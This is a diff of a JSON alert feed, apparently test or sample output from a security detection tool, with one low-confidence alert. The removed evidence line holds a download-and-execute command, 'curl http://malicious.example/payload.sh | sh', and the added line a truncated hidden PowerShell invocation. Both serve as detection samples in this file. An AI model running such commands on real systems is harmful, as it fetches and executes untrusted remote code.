@@ -1,15 +1,15 @@
 {
-  "generated_at": "2025-10-16T16:26:10.517164+00:00",
+  "generated_at": "2025-10-16T17:17:42.192193+00:00",
   "count": 1,
   "alerts": [
     {
-      "id": "alert-64438",
-      "timestamp": "2025-10-16T16:26:10.517147+00:00",
+      "id": "alert-64284",
+      "timestamp": "2025-10-16T17:17:42.192179+00:00",
       "summary": "LOW confidence: Suspicious command observed from 104.21.23.45",
       "confidence": "low",
       "evidence": {
-        "process": "cmd.exe",
-        "command": "curl http://malicious.example/payload.sh | sh",
+        "process": "powershell.exe",
+        "command": "powershell -nop -w hidden -c ...",
         "source_ip": "104.21.23.45"
       }
     }
